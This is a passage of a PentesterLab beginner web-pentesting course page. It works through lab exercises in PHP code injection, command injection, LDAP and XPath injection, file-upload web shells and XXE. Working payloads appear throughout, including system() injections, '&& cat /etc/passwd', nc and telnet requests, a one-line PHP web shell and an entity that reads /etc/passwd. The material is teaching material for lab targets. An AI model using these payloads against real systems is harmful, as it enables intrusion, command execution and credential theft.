<li>By using comment: <code>".system('uname -a');#</code> or <code>".system('uname -a');//</code>.</li>
</ul>

<p>Don't forget that you will need to URL-encode some of the characters (<code>#</code> and <code>;</code>) before sending the request.</p>

<h3>Example 2</h3>

<p>When ordering information, developers use two methods:</p>

<ul>
<li><code>order by</code> in a SQL request;</li>
<li><code>usort</code> in PHP code.</li>
</ul>

<p>The function <code>usort</code> is often used with the function <code>create_function</code> to dynamically generate the "sorting" function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.</p>

<p>By injecting a single quote, we can get an idea of what is going on:</p>

<pre>Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22
</pre>

<p>The source code of the function looks like the following:</p>

<pre>ZEND_FUNCTION(create_function)
{
  [...]
    eval_code = (char *) emalloc(eval_code_length);
    sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));

    eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
    retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
  [...]
</pre>

<p>We can see that the code that will be evaluated is put inside curly brackets <code>{...}</code>, and we will need this information to correctly finish the syntax, after our injection.</p>

<p>As opposed to the previous code injection, here, you are not injecting inside single or double quotes. We know that we need to close the statement with <code>}</code> and comment out the rest of the code using <code>//</code> or <code>#</code> (with encoding). We can try poking around with:</p>

<ul>
<li><code>?order=id;}//</code>: we get an error message (<code>Parse error: syntax error, unexpected ';'</code>). We are probably missing one or more brackets.<br></li>
<li><code>?order=id);}//</code>: we get a <strong>warning</strong>. That seems about right.</li>
<li><code>?order=id));}//</code>: we get an error message (<code>Parse error: syntax error, unexpected ')' i</code>). We probably have too many closing brackets.<br></li>
</ul>

<p>Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using <code>?order=id);}system('uname%20-a');//</code> for example. </p>

<h3>Example 3</h3>

<p>We talked earlier about regular expression modifiers with multi-line regular expression. Another very dangerous modifier exists in PHP: <code>PCRE_REPLACE_EVAL</code> (<code>/e</code>). This modifier will cause the function <code>preg_replace</code> to evaluate the new value as PHP code, before performing the substitution.</p>

<div class="protip">
`PCRE_REPLACE_EVAL` has been deprecated as of PHP 5.5.0
</div>

<p>Here, you will need to change the pattern, by adding the <code>/e</code> modifier. Once you have added this modifier, you should get a notice:</p>

<pre>Notice: Use of undefined constant hacker - assumed 'hacker' in /var/www/codeexec/example3.php(3) : regexp code on line 1
</pre>

<p>The function <code>preg_replace</code> tries to evaluate the value <code>hacker</code> as a constant but it's not defined, and you get this message.</p>

<p>You can easily replace <code>hacker</code> with a call to the function <code>phpinfo()</code> to get a visible result. Once you can see the result of the <code>phpinfo</code> function, you can use the function <code>system</code> to run any command.</p>

<h3>Example 4</h3>

<p>This example is based on the function <code>assert</code>. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution. </p>

<p>By injecting a single quote or double quote (depending on the way the string was declared), we can see an error message indicating that PHP tried to evaluate the code:</p>

<pre>Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4
</pre>

<p>Once we broke the syntax, we need to try to reconstruct it correctly. We can try the following: <code>hacker'.'</code>. The error message disappeared. </p>

<p>Now that we know how to finish the syntax to avoid errors, we can just inject our payload to run the function <code>phpinfo()</code>: <code>hacker'.phpinfo().'</code> and we get the configuration of the PHP engine in the page.</p>

<h2>Command injection</h2>

<p>Command injection comes from a lack of filtering and encoding of information used as part of a command. The simplest example comes from using the function <code>system</code> (to run commands) and take an HTTP parameter as an argument of this command.</p>

<p>There are many ways to exploit a command injection:</p>

<ul>
<li>By injecting the command inside backticks, for example <code>`id`</code> </li>
<li>By redirecting the result of the first command into the second <code>| id</code></li>
<li>By running another command if the first one succeeds: <code>&amp;&amp; id</code> (where <code>&amp;</code> needs to be encoded)</li>
<li>By running another command if the first one fails (and making sure it does: <code>error || id</code> (where <code>error</code> is just here to cause an error).</li>
</ul>

<p>It's also possible to use the same value technique to perform this type of detection. For example, you can replace <code>123</code> with <code>`echo 123`</code>. The command inside backticks will be executed first, and return exactly the same value to be used by the command.</p>

<p>You can also use time-based vectors to detect these kinds of vulnerabilities. You can use a command that will take time to process on the server (with a risk of denial of service). You can also use the command <code>sleep</code> to tell the server to wait a certain amount of time before continuing. For example, using <code>sleep 10</code>.</p>

<h3>Example 1</h3>

<p>The first example is a trivial command injection. The developer didn't perform any input validation, and you can directly inject your commands after the <code>ip</code> parameter.</p>

<p>Based on the techniques seen above, you can for example, use the payload <code>&amp;&amp; cat /etc/passwd</code> (with encoding) to see the content of <code>/etc/passwd</code>.</p>

<h3>Example 2</h3>

<p>This example validates the parameter provided, but does so incorrectly. As we saw before with the SQL injection, the regular expression used is multi-line. Using the same technique we saw for the SQL injection, you can easily gain code execution.</p>

<p>The good thing here is that you don't even need to inject a separator. You can just add the encoded new line (<code>%0a</code>) and then put your command.</p>

<h3>Example 3</h3>

<p>This example is really similar to the previous one; the only difference is that the developer does not stop the script correctly. In PHP, an easy and simple way to redirect users if one of the values provided doesn't match some security constraint is to call the function <code>header</code>. However, even if the browser will get redirected, this function does not stop the execution flow, and the script will still finish to run with the dangerous parameter. The developer needs to call the function <code>die</code> after the call to the function <code>header</code>, to avoid this issue.</p>

<p>You cannot easily exploit this vulnerability in your browser, since your browser will follow the redirect, and will not display the redirecting page. To exploit this issue you can use telnet: </p>

<pre>% telnet vulnerable 80 
GET /commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.0

</pre>

<p>or using netcat:</p>

<pre>% echo "GET /commandexec/example3.php?ip=127.0.0.1|uname+-a HTTP/1.0\r\n" | nc vulnerable 80
</pre>

<p>If you look carefully at the response, you will see that you get a <code>302</code> redirect, but you can see the result of the command <code>uname -a</code> in the body of the response.</p>

<h2>LDAP attacks</h2>

<p>In this section, we will cover LDAP attacks. LDAP is often used as a backend for authentication, especially in Single-Sign-On (SSO) solutions. LDAP has its own syntax that we will see in more detail, in the following examples.</p>

<h3>Example 1</h3>

<p>In this first example, you connect to a LDAP server, using your username and password. In this instance, The LDAP server does not authenticate you, since your credentials are invalid. </p>

<p>However, some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the <code>bind</code> with 2 null values, you will need to completely remove this parameter from the query. If you keep something like <code>username=&amp;password=</code> in the URL, these values will not work, since they won't be null; instead, they will be empty. </p>

<div class="protip">
This is an important check to perform on all login forms that you will test in the future, even if the backend is not LDAP-based.
</div>

<h3>Example 2</h3>

<p>The most common pattern of LDAP injection is to be able to inject in a filter. Here, we will see how you can use LDAP injection to bypass an authentication check.</p>

<p>First, you need to learn a bit of LDAP syntax. When you are retrieving a user, based on its username, the following will be used:</p>

<pre>(cn=[INPUT])
</pre>

<p>If you want to add more conditions and some boolean logic, you can use:</p>

<ul>
<li>A boolean OR using <code>|</code>: <code>(|(cn=[INPUT1])(cn=[INPUT2]))</code> to get records matching <code>[INPUT1]</code> or <code>[INPUT2]</code>.</li>
<li>A boolean AND using <code>&amp;</code>: <code>(&amp;(cn=[INPUT1])(userPassword=[INPUT2]))</code> to get records for which the <code>cn</code> matches <code>[INPUT1]</code> and the password matches <code>[INPUT2]</code>.</li>
</ul>

<p>As you can see, the boolean logic is located at the beginning of the filter. Since you're likely to inject after it, it's not always possible (depending on the LDAP server) to inject logic inside the filter, if it's just <code>(cn=[INPUT])</code>.</p>

<p>LDAP uses the wildcard * character very often, to match any values. This can be used for match everything * or just substrings (for example, <code>adm*</code> for all words starting with <code>adm</code>). </p>

<p>As with other injections, we will need to remove anything added by the server-side code. We can get rid of the end of the filter, using a NULL BYTE (encoded as <code>%00</code>). </p>

<p>Here, we have a login script. We can see that if we use:</p>

<ul>
<li><code>username=hacker&amp;password=hacker</code> we get authenticated (this is the normal request).</li>
<li><code>username=hack*&amp;password=hacker</code> we get authenticated (the wildcard matches the same value).</li>
<li><code>username=hacker&amp;password=hac*</code> we don't get authenticated (the password may likely be hashed).</li>
</ul>

<p>Now, we will see how we can use the LDAP injection, in the <code>username</code> parameter to bypass the authentication. Based on our previous tests, we can deduce that the filter probably looks like: </p>

<pre>(&amp;(cn=[INPUT1])(userPassword=HASH[INPUT2]))
</pre>

<p>Where HASH is an unsalted hash (probably MD5 or SHA1). </p>

<div class="protip">
LDAP supports several formats: `{CLEARTEXT}`, `{MD5}`, `{SMD5}` (salted MD5), `{SHA}`, `{SSHA}` (salted SHA1), `{CRYPT}` for storing passwords.
</div>

<p>Since <code>[INPUT2]</code> is hashed, we cannot use it to inject our payload. </p>

<p>Our goal here will be to inject inside <code>[INPUT1]</code> (the username parameter). We will need to inject:</p>

<ul>
<li>The end of the current filter using <code>hacker)</code>.</li>
<li>An always-true condition (<code>(cn=*)</code> for example)</li>
<li>A <code>)</code> to keep a valid syntax and close the first <code>)</code>. </li>
<li>A NULL BYTE (<code>%00</code>) to get rid of the end of the filter.</li>
</ul>

<p>Once you put this together, you should be able to login as <code>hacker</code> with any password. You can then try to find other users using the wildcard trick. For example, you can use <code>a*</code> in the first part of the filter, and check who you are logged in as.</p>

<p>In most cases, LDAP injection will allow only you to bypass authentication and authorisation checks. Retrieving arbitrary data (as opposed to just getting more results) is often really challenging or impossible.</p>

<h2>Upload</h2>

<p>In this section, we will cover how to use file upload functionalities to gain code execution.</p>

<p>In web applications (especially the ones using the file systems to determine what code should be run), you can get code execution on a server, if you manage to upload a file with the right filename (often depending on the extension). In this section, we will see the basics of these types of attacks.</p>

<p>First, since we are working on a PHP application, we will need a PHP web shell. A web shell is just a simple script or web application that runs the code or commands provided. For example, in PHP, the following code is a really simple web shell:</p>

<pre>&lt;?php
  system($_GET["cmd"]);
?&gt;
</pre>

<p>More complex web shells can perform advanced operations, such as providing database and file system access, or even TCP tunnelling.</p>

<h3>Example 1</h3>

<p>The first example is a really basic upload form, with no restriction. By using the web shell above, and naming it with a <code>.php</code> extension you should be able to get it upload onto the server. Once it's uploaded, you can access the script (with the parameter <code>cmd=uname</code> for example) to get command execution. </p>

<h3>Example 2</h3>

<p>In this second example, the developer put a restriction on the file name. The file name cannot end with <code>.php</code>. To bypass this restriction, you can use one of the following methods:</p>

<ul>
<li>change the extension to <code>.php3</code>. On other systems, extensions like <code>.php4</code> or <code>.php5</code> may also work. It depends on the configuration of the web server.</li>
<li>use an extension that Apache does not know <code>.blah</code> after the extension <code>.php</code>. Since Apache does not know how to handle the extension <code>.blah</code>, it will move to the next one: <code>.php</code> and run the PHP code.</li>
<li>upload a .htaccess file, enabling another extension to be run by PHP (You can learn more about this technique in PentesterLab's training: (From SQL Injection to Shell: PostgreSQL edition)[https://pentesterlab.com/from<em>sqli</em>to<em>shell</em>pg_edition.html]</li>
</ul>

<p>Using one of these methods, you should be able to gain command execution.</p>

<h2>XML related attacks</h2>

<p>In this section, XML related attacks will be detailed. These types of attacks are common with web services and with applications using XPath to retrieve a configuration setting from a XML file (for example, to know what backend they need to use to authenticate a user, based on the organisation's name provided).</p>

<h3>Example 1</h3>

<p>Some XML parsers will resolve external entities, and will allow a user controlling the XML message to access resources; for example to read a file on the system. The following entity can be declared, for example:</p>

<pre>&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;
</pre>

<p>You will need to envelope this properly, in order to get it to work correctly:</p>

<pre>&lt;!DOCTYPE test [
    &lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;]&gt;
</pre>

<p>You can then simply use the reference to <code>x</code>: <code>&amp;x;</code> (don't forget to encode <code>&amp;</code>) to get the corresponding result inserted in the XML document during its parsing (server side). </p>

<p>In this example, the exploitation occurs directly inside a <code>GET</code> request, but it's more likely that these types of requests are performed using a <code>POST</code> request, in a traditional web application. This issue is also really common with web services, and is probably the first test you want to do, when attacking an application that accepts XML messages.</p>

<p>This example can also be used to get the application to perform HTTP requests (by using <code>http://</code> instead of <code>file://</code>) and can be used as a port scanner. However, the content retrieved is often incomplete since the XML parser will try to parse it as part of the document. </p>

<div class="protip">
You can also use `ftp://` and `https://`
</div>

<h3>Example 2</h3>

<p>In this example, the code uses the user's input, inside an XPath expression. XPath is a query language, which selects nodes from an XML document. Imagine the XML document as a database, and XPath as an SQL query. If you can manipulate the query, you will be able to retrieve elements to which you normally should not have access.</p>

<p>If we inject a single quote, we can see the following error:</p>

<pre>Warning: SimpleXMLElement::XPath(): Invalid predicate in /var/www/xml/example2.php on line 7 Warning: SimpleXMLElement::XPath(): xmlXPathEval: evaluation failed in /var/www/xml/example2.php on line 7 Warning: Variable passed to each() is not an array or object in /var/www/xml/example2.php on line 8
</pre>

<p>Just like SQL injection, XPath allows you to do boolean logic, and you can try:</p>

<ul>
<li><code>' and '1'='1</code> and you should get the same result.</li>
<li><code>' or '1'='0</code> and you should get the same result.</li>
<li><code>' and '1'='0</code> and you should not get any result.</li>
<li><code>' or '1'='1</code> and you should get all results.</li>
</ul>

<p>Based on these tests and previous knowledge of XPath, it's possible to get an idea of what the XPath expression looks like:</p>

<pre>[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]
</pre>

<p>To comment out the rest of the XPath expression, you can use a NULL BYTE (which you will need to encode as %00). As we can see in the XPath expression above, we also need to add a <code>]</code> to properly complete the syntax. Our payload now looks like <code>hacker']%00</code> (or <code>hacker' or 1=1]%00</code> if we want all results).</p>

<p>If we try to find the child of the current node, using the payload <code>'%20or%201=1]/child::node()%00</code>, we don't get much information.</p>

<p>Here, the problem is that we need to get back up in the node hierarchy, to get more information. In XPath, this can be done using <code>parent::*</code> as part of the payload. We can now select the parent of the current node, and display all the child node using <code>hacker'%20or%201=1]/parent::*/child::node()%00</code>.</p>

<p>One of the node's value looks like a password. We can confirm this, by checking if the node's name is <code>password</code> using the payload <code>hacker']/parent::*/password%00</code>.</p>

<h1>Conclusion</h1>

<p>This exercise is an attempt to provide a really good beginner course, for people who want to start doing web application penetration testing. If you are interested in this subject, you should check out our other exercises, available at the following address: <a href="https://www.pentesterlab.com/">https://www.pentesterlab.com/</a>. Other exercises are more scenario-based, and more demonstrative of typical web engagements. I hope you have enjoyed learning with PentesterLab.</p>

                        </div>
                    <!--End Table Search v2-->
                </div>
</div>


                <!--End Profile Body-->
            </div>
        </div><!--/end row-->
    </div><!--/container-->    
    <!--=== End Profile ===-->



<div class="modal fade" id="new" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
        <div class="modal-header">
            <button aria-hidden="true" data-dismiss="modal" class="close" type="button">×</button>
            <h4 id="myModalLabel" class="modal-title">Need help?</h4>
        </div>
        <div class="modal-body">
            <h4>Get started with this video to see how things fit together:</h4>
           <iframe src="./wfp_course_files/kdYuJDWxOHc.html" width="500" height="300" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>  

            <h4>If you are using the ISO make sure you add an entry in your host file to match vulnerable with the VM IP address.</h4>
            <h4>If you are using the online system, replace 'vulnerable' with the hostname of the online exercise.</h4>

        <div class="modal-footer">
            <button data-dismiss="modal" class="btn-u btn-u-default" type="button">Close</button>
        </div>
      </div>
  </div>
</div>

 
     </div> <!-- /container -->
       <!--=== Footer ===-->
    <div class="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-4 md-margin-bottom-40">
                    <!-- About -->
                    <div class="headline"><h2>About</h2></div>  
                    <p class="margin-bottom-25 md-margin-bottom-40">PentesterLab is a simple hands-on way to learn web penetration testing. </p>    
                </div><!--/col-md-4-->  
                
                <div class="col-md-4 md-margin-bottom-40">
                    <div class="posts">
                        <div class="headline"><h2>Latest Free Exercises</h2></div>

                        <dl class="dl-horizontal">
                            <dt><a href="https://pentesterlab.com/exercises/cve-2014-4511"><img src="./wfp_course_files/cve-2014-4511-small.png" alt=""></a></dt>
                            <dd>
                                <p><a href="https://pentesterlab.com/exercises/cve-2014-4511">CVE-2014-4511: Gitlist RCE</a></p> 
                            </dd>
                        </dl>

                        <dl class="dl-horizontal">
                            <dt><a href="https://pentesterlab.com/exercises/padding_oracle"><img src="./wfp_course_files/padding_oracle-small.png" alt=""></a></dt>
                            <dd>
                                <p><a href="https://pentesterlab.com/exercises/padding_oracle">Padding Oracle</a></p> 
                            </dd>
                        </dl>

                        <dl class="dl-horizontal">
                            <dt><a href="https://pentesterlab.com/exercises/play_xxe"><img src="./wfp_course_files/play_xxe-small.png" alt=""></a></dt>
                            <dd>
                                <p><a href="https://pentesterlab.com/exercises/play_xxe">Play XML Entities</a></p> 
                            </dd>
                        </dl>
                    </div>
                </div><!--/col-md-4-->

                <div class="col-md-4">
                    <!-- Monthly Newsletter -->
                    <div class="headline"><h2>Contact Us</h2></div> 
                    <address class="md-margin-bottom-40">
                        Email: <a href="mailto:info@pentesterlab.com" class="">info@pentesterlab.com</a>
                    </address>

                    <!-- Stay Connected -->
                    <div class="headline"><h2>Stay Connected</h2></div> 
                    <ul class="social-icons">
                        <li><a href="https://www.facebook.com/pentesterlab" data-original-title="Facebook" target="_blank" class="social_facebook"></a></li>
                        <li><a href="https://twitter.com/PentesterLab" data-original-title="Twitter" target="_blank" class="social_twitter"></a></li>
                        <li><a href="https://plus.google.com/100934348328187709388" target="_blank" data-original-title="Goole Plus" class="social_googleplus"></a></li>
                    </ul>
                </div><!--/col-md-4-->
            </div><!--/row-->   
        </div><!--/container--> 
    </div><!--/footer-->    
    <!--=== End Footer ===-->

    <!--=== Copyright ===-->
    <div class="copyright">
        <div class="container">
            <div class="row">
                <div class="col-md-6">                      
                    <p class="copyright-space">
                        © PentesterLab. ALL Rights Reserved. &nbsp;&nbsp;| <a href="https://pentesterlab.com/terms">Terms and conditions</a>
                    <!--    <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>-->
                    </p>
                </div>
                <div class="col-md-6">  
                    <a href="https://pentesterlab.com/">
                        <img id="logo-footer" src="./wfp_course_files/logo_s.png" class="pull-right" alt="">
                    </a>
                </div>
            </div><!--/row-->
        </div><!--/container--> 
    </div><!--/copyright--> 
    <!--=== End Copyright ===-->
</div><!--/wrapper-->
<script type="text/javascript">
    jQuery(document).ready(function() {
//        App.init();
    });
</script>
<!--[if lt IE 9]>
    <script src="assets/plugins/respond.js"></script>
    <script src="assets/plugins/html5shiv.js"></script>
<![endif]-->


  

</body></html>